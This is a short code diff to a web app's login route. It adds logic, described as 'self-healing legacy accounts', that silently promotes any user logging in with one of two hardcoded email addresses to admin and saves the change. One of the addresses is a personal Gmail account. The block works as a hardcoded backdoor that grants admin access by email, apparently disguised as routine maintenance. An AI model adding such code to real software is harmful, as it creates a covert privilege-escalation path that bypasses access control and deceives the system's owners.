@@ -266,6 +266,17 @@ app.post("/api/auth/login", async (req, res) => {
       return res.status(401).json({ error: "Invalid email or password." });
     }
 
+    // Self-heal legacy accounts: force admin role for known admin emails
+    // even if the DB record was created before this check existed.
+    const isKnownAdminEmail =
+      normalizedEmail === "admin@mclaren.com" ||
+      normalizedEmail === "ronalheng832@gmail.com";
+
+    if (isKnownAdminEmail && user.role !== "admin") {
+      user.role = "admin";
+      await user.save();
+    }
+
     const token = crypto.randomBytes(24).toString("hex");
     await Session.create({ token, userId: user.id });
 
